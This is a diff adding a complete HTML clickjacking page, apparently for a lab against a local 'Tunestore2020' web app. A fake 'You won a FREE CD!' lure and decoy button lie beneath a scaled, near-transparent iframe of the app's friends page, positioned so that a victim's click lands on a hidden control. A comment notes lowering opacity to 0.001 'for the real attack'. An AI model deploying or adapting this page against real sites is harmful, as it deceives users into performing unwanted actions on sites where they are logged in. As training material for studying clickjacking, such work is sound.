@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Free Album Giveaway!</title>
+  <style>
+
+    :root {
+      --frame-opacity: 0.35;   /* 0.35 = alignment/demo view; set to 0.001 for the real attack */
+      --frame-scale: 4;
+      --frame-top:   -435px;   /* move the framed page up/down so the target control lines up */
+      --frame-left:  -780px;    /* move the framed page left/right */
+      --frame-w:     2000px;   /* iframe size - big enough to render the target page normally */
+      --frame-h:     900px;
+      --decoy-top:   240px;
+      --decoy-left:  480px;
+    }
+
+    body { font-family: sans-serif; margin: 0; background: #f4f4f8; }
+
+    .lure {
+      position: fixed; z-index: 1;
+      top: 0; left: 0; right: 0; bottom: 0;
+      text-align: center;
+    }
+    .lure h1 { margin-top: 90px; color: #222; }
+    .decoy-btn {
+      position: fixed; z-index: 1;
+      top: var(--decoy-top); left: var(--decoy-left);
+      padding: 14px 28px; font-size: 20px; font-weight: bold;
+      background: #e63946; color: #fff; border: none; border-radius: 8px;
+      box-shadow: 0 3px 8px rgba(0,0,0,.3); cursor: pointer;
+    }
+
+    .target-frame {
+      position: fixed; z-index: 2;
+      top: var(--frame-top); left: var(--frame-left);
+      width: var(--frame-w); height: var(--frame-h);
+      opacity: var(--frame-opacity);
+      border: 0;
+      transform: scale(var(--frame-scale));
+      transform-origin: top left;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="lure">
+    <h1> You won a FREE CD! </h1>
+    <p>Click the button below to claim your prize before it expires.</p>
+  </div>
+  <button class="decoy-btn">Claim my free CD</button>
+
+  <iframe class="target-frame"
+          src="http://localhost:8082/Tunestore2020/friends.do"></iframe>
+</body>
+</html>
